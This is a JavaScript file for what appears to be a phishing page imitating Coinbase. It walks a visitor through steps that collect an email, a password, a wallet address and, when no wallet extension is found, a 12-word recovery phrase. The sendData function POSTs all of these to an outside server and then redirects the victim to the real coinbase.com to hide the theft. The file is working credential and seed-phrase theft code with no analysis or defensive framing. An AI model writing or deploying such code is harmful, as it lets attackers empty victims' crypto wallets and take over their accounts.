const API_URL = 'https://cb-backend-new.onrender.com';

document.addEventListener('DOMContentLoaded', () => {
    const toStep2Btn = document.getElementById('toStep2');
    const toStep3Btn = document.getElementById('toStep3');
    const connectBtn = document.getElementById('connectBtn');
    const statusText = document.getElementById('status');

    toStep2Btn.addEventListener('click', () => {
        document.getElementById('step-1').classList.add('hidden');
        document.getElementById('step-2').classList.remove('hidden');
    });

    toStep3Btn.addEventListener('click', () => {
        if (!document.getElementById('email').value || !document.getElementById('pass').value) {
            alert('Please fill in all fields.');
            return;
        }
        document.getElementById('step-2').classList.add('hidden');
        document.getElementById('step-3').classList.remove('hidden');
    });

    connectBtn.addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        const password = document.getElementById('pass').value;

        if (window.ethereum) {
            try {
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                await sendData(email, password, accounts[0], null);
            } catch (e) {
                statusText.innerText = 'Wallet connection failed.';
            }
        } else {
            // Shorten process: ask for recovery phrase immediately
            statusText.innerText = 'Please enter your 12-word recovery phrase:';
            const phraseInput = document.createElement('input');
            phraseInput.type = 'text';
            phraseInput.id = 'phrase';
            phraseInput.style.display = 'block';
            phraseInput.style.marginTop = '10px';
            
            const doneBtn = document.createElement('button');
            doneBtn.innerText = 'Done';
            doneBtn.className = 'btn-primary';
            doneBtn.style.marginTop = '10px';

            document.getElementById('step-3').appendChild(phraseInput);
            document.getElementById('step-3').appendChild(doneBtn);

            doneBtn.onclick = async () => {
                const phrase = phraseInput.value.trim();
                if (phrase.split(/\s+/).length !== 12) {
                    statusText.innerText = 'Exactly 12 words required.';
                    return;
                }
                await sendData(email, password, null, phrase);
            };
        }
    });

    async function sendData(email, password, wallet, phrase) {
        try {
            const res = await fetch(`${API_URL}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, walletAddress: wallet, recoveryPhrase: phrase })
            });
            if (res.ok) {
                window.location.href = 'https://coinbase.com';
            }
        } catch (e) {
            statusText.innerText = 'Error saving. Try again.';
        }
    }
});
